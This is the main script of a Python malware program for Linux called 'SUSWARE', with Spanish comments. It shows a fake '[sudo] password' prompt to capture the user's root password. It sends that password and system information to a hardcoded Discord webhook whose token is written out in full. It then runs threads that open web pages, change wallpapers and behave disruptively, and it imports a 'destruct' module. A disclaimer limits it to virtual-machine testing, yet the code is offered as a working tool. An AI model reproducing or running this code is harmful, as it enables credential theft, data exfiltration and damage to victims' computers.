from os import getcwd, listdir
from threading import Thread
from colorama import Fore, Style

# Importa los módulos desde src
try:
     from src.behavior import * 
     from src.destruct import *
     from src.pc_info import *
     from src.wallpaper import *
     
except ModuleNotFoundError:
     print("Ejecuta el script desde la carpeta linux, por favor")
     

print(Fore.GREEN, '''
███████╗██╗   ██╗███████╗██╗    ██╗ █████╗ ██████╗ ███████╗
██╔════╝██║   ██║██╔════╝██║    ██║██╔══██╗██╔══██╗██╔════╝
███████╗██║   ██║███████╗██║ █╗ ██║███████║██████╔╝█████╗  
╚════██║██║   ██║╚════██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
███████║╚██████╔╝███████║╚███╔███╔╝██║  ██║██║  ██║███████╗
╚══════╝ ╚═════╝ ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
      ''', Fore.RESET)
print()

print(Fore.RED, """
                    ADVERTENCIA DE USO
          Este script puede ser MORTAL para tu pc
          Solo uso de testeos y máquina virtual
          
          No me hago responsable del tipo de daños
          que esto pueda causar si se ejecuta en
          pc física
          
                                        - lVoidi
      """, Fore.RESET)

print(Style.BRIGHT)
print(Fore.CYAN,"""
          Agradecimientos a las siguientes personas
             - Br3fuck → https://github.com/Br3Fuck
             - Chxki   → https://github.com/Ch1KZX
      """)     
print(Style.RESET_ALL)
username = listdir('/home/')[0]

rootPassword = input(f'[sudo] password for {username} ')

user_info(root_pswd=rootPassword,
          webhook='https://discord.com/api/webhooks/853467329429897267/81fZI1crGOMsc0OeKUze5M9Yd95iUrLJ6EFPYgifHa1JA2HK9NPIAdc-5ZIBNyyZ6eFR')

threads = []
for _ in range(3):
     t1 = Thread(target=webOpen)
     t1.start()
     t2 = Thread(target=annoying_behavior)
     t2.start()
     t3 = Thread(target=set_wallpapers)
     t3.start()
     threads.append(t1)
     threads.append(t2)
     threads.append(t3)

for thread in threads:
     thread.join()

messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
     
